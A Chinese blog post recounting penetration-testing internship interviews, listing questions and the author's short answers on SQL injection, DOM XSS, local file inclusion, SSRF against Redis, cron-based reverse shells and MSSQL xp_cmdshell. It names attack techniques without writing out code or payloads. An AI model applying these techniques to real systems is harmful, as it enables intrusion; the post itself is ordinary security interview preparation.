<p>updataxml()，extractvalue()紧张到忘了第一个都忘了，日了。然后问还有其他的吗？？我？</p>
<ul>
<li>xml全称</li>
</ul>
<p>不会了。（EXtensible Markup Language）</p>
<ul>
<li>http-only怎么绕过</li>
</ul>
<p>以前看过的，忘了。</p>
<ul>
<li>SQL盲注怎样提高效率</li>
</ul>
<p>回答二分法，（结束后百度的<a href="https://www.freebuf.com/articles/web/231741.html%EF%BC%89">https://www.freebuf.com/articles/web/231741.html）</a></p>
<ul>
<li>domxss能被waf拦截吗</li>
</ul>
<p>肯定不能啊，巴拉巴拉说了一下。</p>
<ul>
<li>domxss发生在DOM文档里面还是外面</li>
</ul>
<p>我说在DOM节点上</p>
<ul>
<li>本地文件包含getshell方式</li>
</ul>
<ol>
<li>包含jpg文件（有木马）去getshell</li>
<li>读配置文件</li>
<li>伪协议（data忘记了）</li>
</ol>
<p>问我还有吗，后面就不知道了。</p>
<ul>
<li>代码审计了解吗，审计过什么</li>
</ul>
<p>说下自己打ctf遇见的一些题目，还有dedecms，还有些忘记了，就说没有了。</p>
<ul>
<li>如何利用ssrf</li>
</ul>
<p>file协议，dict协议，打redis。（不全）</p>
<ul>
<li>没有回显ssrf如何判断</li>
</ul>
<p>我说用dnslog回显，他说这个只能判断他出网，不能判断他是否能访问内网，然后不知道了，貌似以前看到过。后面在学学吧。</p>
<p>二面开始有点紧张，面的很细节，感觉很多没有回答出来，感觉很cccc，感觉简历只面了一半，应该面试官认为我太菜了~~，不想面我了。gg了。长亭二面含金量太高了。</p>
<p>内推的，直接投，没有人理我。</p>
<hr>
<h2 id="杭州默安"><a href="#杭州默安" class="headerlink" title="杭州默安"></a>杭州默安</h2><ul>
<li>2022.3.28 渗透测试 \安服 实习生   ，base南京</li>
<li>很突然，正在玩一个电话打了过来</li>
</ul>
<ol>
<li>介绍自己</li>
<li>看你写有了解后渗透，说下具体</li>
<li>你对哪方面擅长（web渗透，代码审计，后渗透）</li>
<li>sql注入，判断，过滤</li>
<li>登陆框如何利用</li>
<li>xss分类  ？？/?</li>
<li>ssrf 利用，</li>
<li>ssrf+redis  如何getshell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">计划任务反弹shell</span><br><span class="line"></span><br><span class="line">主从复制   （不会）</span><br></pre></td></tr></table></figure>

<ol start="10">
<li><p>csrf 发生，利用</p>
</li>
<li><p>mssql命令执行函数</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> xp_cmdshell</span><br><span class="line"></span><br><span class="line">**SP_OACREATE** (这个忘了)</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>说下你代码审计</li>
<li>说下你的问题</li>
</ol>
<p>感觉很面的基础，没有很深入问，</p>
]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>2021面经</tag>
      </tags>
  </entry>
</search>
